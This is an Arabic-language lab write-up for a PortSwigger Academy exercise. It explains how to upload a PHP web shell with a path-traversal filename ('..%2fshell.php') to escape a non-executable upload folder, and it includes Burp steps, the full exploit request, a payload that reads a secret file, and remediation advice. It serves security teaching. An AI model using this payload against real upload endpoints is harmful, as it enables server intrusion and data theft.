# Lab 03 — Web Shell Upload via Path Traversal (دمج رفع الملفات مع Path Traversal)

[![التصنيف](https://img.shields.io/badge/الفئة-File%20Upload-indigo)]()
[![النوع](https://img.shields.io/badge/النوع-File%20Upload%20via%20Path%20Traversal-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> هذا الشرح جزء من سلسلة [معامل ثغرات رفع الملفات (File Upload)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 03 — Web Shell Upload via Path Traversal (دمج رفع الملفات مع Path Traversal) |
| **تصنيف الثغرة** | File Upload via Path Traversal |
| **معيار الضعف (CWE)** | CWE-434 / CWE-22: Path Traversal in Upload |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | رفع ويب شل خارج مجلد الصور غير التنفيذي إلى مجلد تنفيذي أعلى باستخدام ..%2f وقراءة سر carlos. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

قام المطور هنا بحركة أمان جيدة: قام بتعطيل تشغيل سكربتات PHP داخل مجلد الصور `/files/avatars/`! إذا رفعت ملف `.php` داخله وطلبته في المتصفح، يرجع السيرفر كود الملف كنص خام ولا ينفذه.

**فكرة الالتفاف الماكرة:**
السيرفر يأخذ اسم الملف المرفوع ويدمجه مباشرة في مسار الحفظ: `/files/avatars/ + filename`.
إذا قمنا بتعديل اسم الملف أثناء الرفع ليكون: `filename="..%2fshell.php"`:
1. يقبل السيرفر الملف.
2. عند كتابته على القرص، يفسر النظام `../` فيخرج بالملف درجة واحدة للوراء ويحفظه في المجلد الأب: `/files/shell.php`!
3. المجلد الأب `/files/` غير مطبق عليه حظر تشغيل PHP، فيتم تنفيذ الشل بنجاح!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يحقن تتابع `..%2f` في باراميتر اسم الملف لتهريب الشل من مجلد الرفع المعزول إلى مجلد تنفيذي.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
عدم تجريد اسم الملف من تتابعات مسارات الهروب قبل دمجه في دالة حفظ الملفات على القرص.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. سجل دخولك بحساب `wiener:peter`.
2. حاول رفع `shell.php`، وافتحه، ستلاحظ أن كود الـ PHP يظهر كنص صريح دون تنفيذ لأن المجلد معطل.
3. اعترض طلب الرفع في Burp Suite وأرسله إلى **Repeater**.
4. في سطر `Content-Disposition`، عدل اسم الملف مع تشفير السلاش:
`filename="..%2fshell.php"` (وتأكد من ضبط `Content-Type: image/jpeg`).
5. أرسل الطلب، ستجد رسالة النجاح: `The file avatars/../shell.php has been uploaded`.
6. الآن، اطلب الملف من المجلد الأب مباشرة:
`GET /files/shell.php HTTP/1.1`.
7. ستجد أن السيرفر نفذ الكود بنجاح وعرض السر المطلوب!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

The file avatars/../shell.php has been uploaded.
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تجاوز إعدادات عزل المجلدات وتنفيذ شل الأوامر في مسارات النظام العامة.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

تجريد اسم الملف من أي مسارات نسبية باستخدام دالة `basename()` وتوليد اسم عشوائي لكل ملف مرفوع.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Top 10 — Vulnerabilities](https://owasp.org/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
